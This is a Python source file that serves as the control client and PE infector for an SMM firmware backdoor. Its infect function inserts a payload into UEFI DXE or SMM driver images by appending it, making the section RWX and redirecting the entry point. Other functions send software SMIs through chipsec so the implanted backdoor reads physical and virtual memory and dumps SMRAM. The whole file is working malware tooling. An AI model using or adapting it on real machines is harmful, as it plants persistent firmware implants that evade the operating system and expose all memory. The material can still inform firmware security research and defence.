#!/usr/bin/env python

import sys, os, shutil
from struct import pack, unpack
from optparse import OptionParser, make_option

# SW SMI command value for communicating with backdoor SMM code
BACKDOOR_SW_SMI_VAL = 0xCC

# SW SMI commands for backdoor
BACKDOOR_SW_DATA_PING           = 0 # test for allive SMM backdoor
BACKDOOR_SW_DATA_READ_PHYS_MEM  = 1 # read physical memory command
BACKDOOR_SW_DATA_READ_VIRT_MEM  = 2 # read virtual memory command
BACKDOOR_SW_DATA_WRITE_PHYS_MEM = 3 # write physical memory command
BACKDOOR_SW_DATA_WRITE_VIRT_MEM = 4 # write virtual memory command
BACKDOOR_SW_DATA_TIMER_ENABLE   = 5 # enable periodic timer handler
BACKDOOR_SW_DATA_TIMER_DISABLE  = 6 # disable periodic timer handler

# See struct _INFECTOR_CONFIG in SmmBackdoor.h
INFECTOR_CONFIG_SECTION = '.conf'
INFECTOR_CONFIG_FMT = 'QI'
INFECTOR_CONFIG_LEN = 8 + 4

# IMAGE_DOS_HEADER.e_res magic constant to mark infected file
INFECTOR_SIGN = 'INFECTED'

# EFI variable with struct _BACKDOOR_INFO physical address
BACKDOOR_INFO_EFI_VAR = 'SmmBackdoorInfo-3a452e85-a7ca-438f-a5cb-ad3a70c5d01b'
BACKDOOR_INFO_FMT = 'QQQQQ'
BACKDOOR_INFO_LEN = 8 * 5

# idicate that SMRAM regions were copied to BACKDOOR_INFO structure
BACKDOOR_INFO_FULL = 0xFFFFFFFF

PAGE_SIZE = 0x1000

cs = None

class ChipsecWrapper(object):

    def __init__(self):

        try:

            import chipsec.chipset
            import chipsec.hal.uefi
            import chipsec.hal.physmem
            import chipsec.hal.interrupts

        except ImportError:

            print('ERROR: chipsec is not installed')
            exit(-1)

        self.cs = chipsec.chipset.cs()
        
        # load chipsec helper
        self.cs.init(None, True)
    
        # load needed sumbmodules
        self.intr = chipsec.hal.interrupts.Interrupts(self.cs)
        self.uefi = chipsec.hal.uefi.UEFI(self.cs)        
        self.mem = chipsec.hal.physmem.Memory(self.cs)

    def efi_var_get(self, name):

        # parse variable name string of name-GUID format
        name = name.split('-')

        # get variable data
        return self.uefi.get_EFI_variable(name[0], '-'.join(name[1: ]), None)

    efi_var_get_8 = lambda self, name: unpack('B', self.efi_var_get(name))[0]
    efi_var_get_16 = lambda self, name: unpack('H', self.efi_var_get(name))[0]
    efi_var_get_32 = lambda self, name: unpack('I', self.efi_var_get(name))[0]
    efi_var_get_64 = lambda self, name: unpack('Q', self.efi_var_get(name))[0]

    def mem_read(self, addr, size): 

        # read memory contents
        return self.mem.read_physical_mem(addr, size)

    mem_read_8 = lambda self, addr: unpack('B', self.mem_read(addr, 1))[0]
    mem_read_16 = lambda self, addr: unpack('H', self.mem_read(addr, 2))[0]
    mem_read_32 = lambda self, addr: unpack('I', self.mem_read(addr, 4))[0]
    mem_read_64 = lambda self, addr: unpack('Q', self.mem_read(addr, 8))[0]

    def send_sw_smi(self, command, data, arg):

        # fire synchronous SMI
        self.intr.send_SW_SMI(0, command, data, 0, 0, arg, 0, 0, 0)

def get_backdoor_info_addr():

    # get _BACKDOOR_INFO structure address
    return cs.efi_var_get_64(BACKDOOR_INFO_EFI_VAR)

def get_backdoor_info(addr = None):

    addr = get_backdoor_info_addr() if addr is None else addr

    # read _BACKDOOR_INFO structure contents
    return unpack(BACKDOOR_INFO_FMT, cs.mem_read(addr, BACKDOOR_INFO_LEN))

def get_backdoor_info_mem(addr = None):

    addr = get_backdoor_info_addr() if addr is None else addr

    return cs.mem_read(addr + PAGE_SIZE, PAGE_SIZE)

def get_smram_info():

    ret = []  
    backdoor_info = get_backdoor_info_addr()  
    addr, size = backdoor_info + BACKDOOR_INFO_LEN, 8 * 4    

    # dump array of EFI_SMRAM_DESCRIPTOR structures
    while True:

        '''
            typedef struct _EFI_SMRAM_DESCRIPTOR 
            {
                EFI_PHYSICAL_ADDRESS PhysicalStart; 
                EFI_PHYSICAL_ADDRESS CpuStart; 
                UINT64 PhysicalSize; 
                UINT64 RegionState;

            } EFI_SMRAM_DESCRIPTOR;
        '''            
        physical_start, cpu_start, physical_size, region_state = unpack('Q' * 4, cs.mem_read(addr, size))            

        if physical_start == 0:

            # no more items
            break

        ret.append(( physical_start, physical_size, region_state ))
        addr += size

    return ret

def backdoor_ctl(code, arg):

    # send request to the backdoor
    cs.send_sw_smi(BACKDOOR_SW_SMI_VAL, code, arg)

def backdoor_read_virt_page(addr):

    # read virtual memory page
    backdoor_ctl(BACKDOOR_SW_DATA_READ_VIRT_MEM, addr)
        
    return get_backdoor_info_mem()

def backdoor_read_phys_page(addr):

    # read physical memory page
    backdoor_ctl(BACKDOOR_SW_DATA_READ_PHYS_MEM, addr)
        
    return get_backdoor_info_mem()

def backdoor_timer_enable():

    # enable periodic timer SMI handler
    backdoor_ctl(BACKDOOR_SW_DATA_TIMER_ENABLE, 0)
        
def backdoor_timer_disable():

    # disable periodic timer SMI handler
    backdoor_ctl(BACKDOOR_SW_DATA_TIMER_DISABLE, 0)

def dump_mem_page(addr, count = None):

    ret = ''
    backdoor_info = get_backdoor_info_addr()
    count = 1 if count is None else count    

    for i in range(count):

        # send read memory page command to SMM code
        page_addr = addr + PAGE_SIZE * i
        backdoor_ctl(BACKDOOR_SW_DATA_READ_PHYS_MEM, page_addr)

        _, _, last_status, _, _ = get_backdoor_info(addr = backdoor_info)
        if last_status != 0:

            raise Exception('SMM backdoor error 0x%.8x' % last_status)

        # copy readed page contents from physical memory
        ret += get_backdoor_info_mem(addr = backdoor_info)

    return ret

def dump_smram():        

    # get backdoor status
    info_addr = get_backdoor_info_addr()
    _, _, last_status, _, _ = get_backdoor_info(addr = info_addr)

    # get SMRAM information
    regions, contents = get_smram_info(), []
    regions_merged = []

    if len(regions) > 1:

        # join neighbour regions
        for i in range(0, len(regions) - 1):

            curr_addr, curr_size, curr_opt = regions[i]
            next_addr, next_size, next_opt = regions[i + 1]

            if curr_addr + curr_size == next_addr:

                # join two regions
                regions[i + 1] = ( curr_addr, curr_size + next_size, curr_opt )

            else:

                # copy region information
                regions_merged.append(( curr_addr, curr_size, curr_opt ))

        region_addr, region_size, region_opt = regions[-1]
        regions_merged.append(( region_addr, region_size, region_opt ))

    elif len(regions) > 0:

        regions_merged = regions

    else:

        raise(Exception('No SMRAM regions found'))

    print('[+] Dumping SMRAM regions, this may take a while...')

    try:

        ptr = PAGE_SIZE

        # enumerate and dump available SMRAM regions
        for region in regions_merged: 
            
            region_addr, region_size, _ = region            
            name = 'SMRAM_dump_%.8x_%.8x.bin' % (region_addr, region_addr + region_size - 1)

            if last_status == BACKDOOR_INFO_FULL:

                # dump region contents from BACKDOOR_INFO structure
                data = cs.mem_read(info_addr + ptr, region_size)
                ptr += region_size

            else:

                # dump region contents with sending SW SMI to SMM backdoor
                data = dump_mem_page(region_addr, region_size / PAGE_SIZE)

            contents.append(( name, data ))

        # save dumped data to files
        for name, data in contents:

            with open(name, 'wb') as fd:

                print('[+] Creating %s' % name)
                fd.write(data) 

    except IOError, why:

        print('ERROR: %s' % str(why))
        return False

def check_system():    

    try:

        backdoor_ctl(BACKDOOR_SW_DATA_PING, 0x31337)

        backdoor_info = get_backdoor_info_addr()
        print('[+] struct _BACKDOOR_INFO physical address is 0x%x' % backdoor_info)

        calls_count, ticks_count, last_status, smm_mca_cap, smm_feature_control = \
            get_backdoor_info(addr = backdoor_info)

        print('[+] BackdoorEntry() calls count is %d' % calls_count)
        print('[+] PeriodicTimerDispatch2Handler() calls count is %d' % ticks_count)
        print('[+] Last status code is 0x%.8x' % last_status)
        print('[+] MSR_SMM_MCA_CAP register value is 0x%x' % smm_mca_cap)
        print('[+] MSR_SMM_FEATURE_CONTROL register value is 0x%x' % smm_feature_control)

        print('[+] SMRAM map:')

        # enumerate available SMRAM regions
        for region in get_smram_info():        
        
            physical_start, physical_size, region_state = region 

            print('    address = 0x%.8x, size = 0x%.8x, state = 0x%x' % \
                  (physical_start, physical_size, region_state))

        return True

    except IOError, why:

        print('ERROR: %s' % str(why))
        return False

def infect(src, payload, dst = None):

    try:

        import pefile

    except ImportError:

        print('ERROR: pefile is not installed')
        exit(-1)

    def _infector_config_offset(pe):
        
        for section in pe.sections:

            # find .conf section of payload image
            if section.Name[: len(INFECTOR_CONFIG_SECTION)] == INFECTOR_CONFIG_SECTION:

                return section.PointerToRawData

        raise Exception('Unable to find %s section' % INFECTOR_CONFIG_SECTION)

    def _infector_config_get(pe, data):

        offs = _infector_config_offset(pe)
        
        return unpack(INFECTOR_CONFIG_FMT, data[offs : offs + INFECTOR_CONFIG_LEN])        

    def _infector_config_set(pe, data, *args):

        offs = _infector_config_offset(pe)

        return data[: offs] + \
               pack(INFECTOR_CONFIG_FMT, *args) + \
               data[offs + INFECTOR_CONFIG_LEN :]

    # load target image
    pe_src = pefile.PE(src)

    # load payload image
    pe_payload = pefile.PE(payload)
    
    if pe_src.DOS_HEADER.e_res == INFECTOR_SIGN:

        raise Exception('%s is already infected' % src)        

    if pe_src.FILE_HEADER.Machine != pe_payload.FILE_HEADER.Machine:

        raise Exception('Architecture missmatch')

    # read payload image data into the string
    data = open(payload, 'rb').read()

    # read _INFECTOR_CONFIG, this structure is located at .conf section of payload image
    conf_ep_new, conf_ep_old = _infector_config_get(pe_payload, data) 

    last_section = None
    for section in pe_src.sections:

        # find last section of target image
        last_section = section

    if last_section.Misc_VirtualSize > last_section.SizeOfRawData:

        raise Exception('Last section virtual size must be less or equal than raw size')

    # save original entry point address of target image
    conf_ep_old = pe_src.OPTIONAL_HEADER.AddressOfEntryPoint

    print('Original entry point RVA is 0x%.8x' % conf_ep_old )
    print('Original %s virtual size is 0x%.8x' % \
          (last_section.Name.split('\0')[0], last_section.Misc_VirtualSize))

    print('Original image size is 0x%.8x' % pe_src.OPTIONAL_HEADER.SizeOfImage)

    # write updated _INFECTOR_CONFIG back to the payload image
    data = _infector_config_set(pe_payload, data, conf_ep_new, conf_ep_old)

    # set new entry point of target image
    pe_src.OPTIONAL_HEADER.AddressOfEntryPoint = \
        last_section.VirtualAddress + last_section.SizeOfRawData + conf_ep_new    

    # update last section size
    last_section.SizeOfRawData += len(data)
    last_section.Misc_VirtualSize = last_section.SizeOfRawData

    # make it executable
    last_section.Characteristics = pefile.SECTION_CHARACTERISTICS['IMAGE_SCN_MEM_READ'] | \
                                   pefile.SECTION_CHARACTERISTICS['IMAGE_SCN_MEM_WRITE'] | \
                                   pefile.SECTION_CHARACTERISTICS['IMAGE_SCN_MEM_EXECUTE']  

    print('Characteristics of %s section was changed to RWX' % last_section.Name.split('\0')[0])

    # update image headers
    pe_src.OPTIONAL_HEADER.SizeOfImage = last_section.VirtualAddress + last_section.Misc_VirtualSize
    pe_src.DOS_HEADER.e_res = INFECTOR_SIGN    

    print('New entry point RVA is 0x%.8x' % pe_src.OPTIONAL_HEADER.AddressOfEntryPoint)
    print('New %s virtual size is 0x%.8x' % \
          (last_section.Name.split('\0')[0], last_section.Misc_VirtualSize))

    print('New image size is 0x%.8x' % pe_src.OPTIONAL_HEADER.SizeOfImage)

    # get infected image data
    data = pe_src.write() + data

    if dst is not None:

        with open(dst, 'wb') as fd:

            # save infected image to the file
            fd.write(data)

    return data

def hexdump(data, width = 16, addr = 0):

    ret = ''

    def quoted(data):

        # replace non-alphanumeric characters
        return ''.join(map(lambda b: b if b.isalnum() else '.', data))

    while data:

        line = data[: width]
        data = data[width :]

        # put hex values
        s = map(lambda b: '%.2x' % ord(b), line)
        s += [ '  ' ] * (width - len(line))

        # put ASCII values
        s = '%s | %s' % (' '.join(s), quoted(line))

        if addr is not None:

            # put address
            s = '%.8x: %s' % (addr, s)
            addr += len(line)

        ret += s + '\n'

    return ret

def chipsec_init():

    global cs    
    
    # initialize chipsec
    cs = ChipsecWrapper()

def main():    

    option_list = [

        make_option('-i', '--infect', dest = 'infect', default = None,
            help = 'infect existing DXE, SMM or combined driver image'),

        make_option('-p', '--payload', dest = 'payload', default = None,
            help = 'infect payload path'),

        make_option('-o', '--output', dest = 'output', default = None,
            help = 'file path to save infected file'),

        make_option('-t', '--test', dest = 'test', action = 'store_true', default = False,
            help = 'test system for active infection'),

        make_option('-d', '--dump-smram', dest = 'dump_smram', action = 'store_true', default = False,
            help = 'dump SMRAM contents into the file'), 

        make_option('--read-phys', dest = 'read_phys', default = None,
            help = 'read physical memory page'),

        make_option('--read-virt', dest = 'read_virt', default = None,
            help = 'read virtual memory page'),

        make_option('--timer-enable', dest = 'timer_enable', action = 'store_true', default = False,
            help = 'enable periodic timer SMI handler'),

        make_option('--timer-disable', dest = 'timer_disable', action = 'store_true', default = False,
            help = 'disable periodic timer SMI handler')
    ]

    parser = OptionParser(option_list = option_list)
    (options, args) = parser.parse_args()

    if options.infect is not None:

        if options.payload is None:

            print('[!] --payload must be specified')
            return -1

        print('[+] Target image to infect: %s' % options.infect)
        print('[+] Infector payload: %s' % options.payload)

        if options.output is None:

            backup = options.infect + '.bak'
            options.output = options.infect

            print('[+] Backup: %s' % backup)

            # backup original file
            shutil.copyfile(options.infect, backup)

        print('[+] Output file: %s' % options.output)

        # infect source file with specified payload
        infect(options.infect, options.payload, dst = options.output) 

        print('[+] DONE')

        return 0

    elif options.test:

        chipsec_init()
        check_system()

        return 0

    elif options.dump_smram:

        chipsec_init()
        dump_smram()

        return 0

    elif options.read_phys is not None:

        addr = int(options.read_phys, 16)

        chipsec_init()
        print(hexdump(backdoor_read_phys_page(addr), addr = addr))

        return 0

    elif options.read_virt is not None:

        addr = int(options.read_virt, 16)

        chipsec_init()
        print(hexdump(backdoor_read_virt_page(addr), addr = addr))

        return 0

    elif options.timer_enable:

        chipsec_init()
        backdoor_timer_enable()
        
        return 0

    elif options.timer_disable:

        chipsec_init()
        backdoor_timer_disable()

        return 0    

    else:

        print('[!] No actions specified, try --help')
        return -1

# def end

if __name__ == '__main__':
    
    sys.exit(main())

#
# EoF
#
